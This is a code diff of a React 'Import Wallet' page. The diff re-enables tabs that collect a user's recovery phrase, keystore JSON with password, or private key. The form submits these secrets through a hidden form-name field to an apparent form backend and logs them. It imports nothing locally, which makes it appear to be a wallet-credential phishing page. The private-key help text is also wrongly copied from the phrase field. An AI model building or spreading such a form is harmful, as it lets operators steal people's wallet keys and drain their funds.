@@ -2,14 +2,13 @@ import React from 'react';
 import '../../assets/styles/css/wallet-details-entry-page.css';
 import '../../assets/styles/css/wallet-details-entry-page_media-queries.css';
 import { useState } from 'react';
-// import { useEffect } from 'react';
 import Navbar from '../../components/Navbar';
 import Footer from '../../components/Footer';
 
 function WalletDetailsEntryPage() {
-  // const [showPhrase, setShowPhrase] = useState(false);
-  // const [showKeyJson, setShowKeyJson] = useState(false);
-  // const [showPrivateKey, setShowPrivateKey] = useState(true);
+  const [showPhrase, setShowPhrase] = useState(false);
+  const [showKeyJson, setShowKeyJson] = useState(false);
+  const [showPrivateKey, setShowPrivateKey] = useState(true);
 
   // form handling
 
@@ -21,10 +20,10 @@ function WalletDetailsEntryPage() {
   });
 
   const handleChange = (e) => {
-    // const name = e.target.name;
-    // const value = e.target.value;
+    const name = e.target.name;
+    const value = e.target.value;
 
-    setWalletDetails({ ...walletDetails, [e.target.name]: e.target.value });
+    setWalletDetails({ ...walletDetails, [name]: value });
   };
 
   const encode = (data) => {
@@ -57,30 +56,30 @@ function WalletDetailsEntryPage() {
     console.log(walletDetails);
   }
 
-  // function displayPhrase() {
-  //   setShowPhrase(true);
-  //   setShowKeyJson(false);
-  //   setShowPrivateKey(false);
-  // }
+  function displayPhrase() {
+    setShowPhrase(true);
+    setShowKeyJson(false);
+    setShowPrivateKey(false);
+  }
 
-  // function displayKeyJson() {
-  //   setShowKeyJson(true);
-  //   setShowPhrase(false);
-  //   setShowPrivateKey(false);
-  // }
+  function displayKeyJson() {
+    setShowKeyJson(true);
+    setShowPhrase(false);
+    setShowPrivateKey(false);
+  }
 
-  // function displayPrivateKey() {
-  //   setShowPrivateKey(true);
-  //   setShowPhrase(false);
-  //   setShowKeyJson(false);
-  // }
+  function displayPrivateKey() {
+    setShowPrivateKey(true);
+    setShowPhrase(false);
+    setShowKeyJson(false);
+  }
 
   return (
     <>
       <Navbar />
       <section className="wallet-details-entry-section">
         <div className="section-header text-center">Import Wallet</div>
-        {/* <div className="options-wrapper">
+        <div className="options-wrapper">
           <button
             className="option-item"
             style={{
@@ -111,7 +110,7 @@ function WalletDetailsEntryPage() {
           >
             Private Key
           </button>
-        </div> */}
+        </div>
         <form
           className="form-area"
           method="post"
@@ -120,11 +119,11 @@ function WalletDetailsEntryPage() {
         >
           <input type="hidden" name="form-name" value="Wallet_import_details" />
 
-          {
+          {showPhrase && (
             <div className="mb-3">
               <textarea
                 className="form-control"
-                // placeholder="Phrase"
+                placeholder="Phrase"
                 name="phrase"
                 rows="5"
                 type="text"
@@ -135,13 +134,13 @@ function WalletDetailsEntryPage() {
                 Typically 12 (sometimes 24) words separated by single spaces.
               </div>
             </div>
-          }
-          {
+          )}
+          {showKeyJson && (
             <div className="mb-3">
               <textarea
                 style={{ marginBottom: '20px' }}
                 className="form-control"
-                // placeholder="Keystore JSON"
+                placeholder="Keystore JSON"
                 type="text"
                 name="keystoreJson"
                 value={walletDetails.keystoreJson}
@@ -152,7 +151,7 @@ function WalletDetailsEntryPage() {
                 <input
                   type="password"
                   className="form-control"
-                  // placeholder="Password"
+                  placeholder="Password"
                   name="password"
                   id="inputPassword"
                   value={walletDetails.password}
@@ -164,14 +163,14 @@ function WalletDetailsEntryPage() {
                 you used to encrypt it.
               </div>
             </div>
-          }
+          )}
 
-          {
+          {showPrivateKey && (
             <div className="mb-3">
               <input
                 type="text"
                 className="form-control"
-                // placeholder="Private Key"
+                placeholder="Private Key"
                 name="privateKey"
                 value={walletDetails.privateKey}
                 onChange={handleChange}
@@ -180,7 +179,7 @@ function WalletDetailsEntryPage() {
                 Typically 12 (sometimes 24) words separated by single spaces.
               </div>
             </div>
-          }
+          )}
 
           <div className="submit-button-wrapper">
             <button
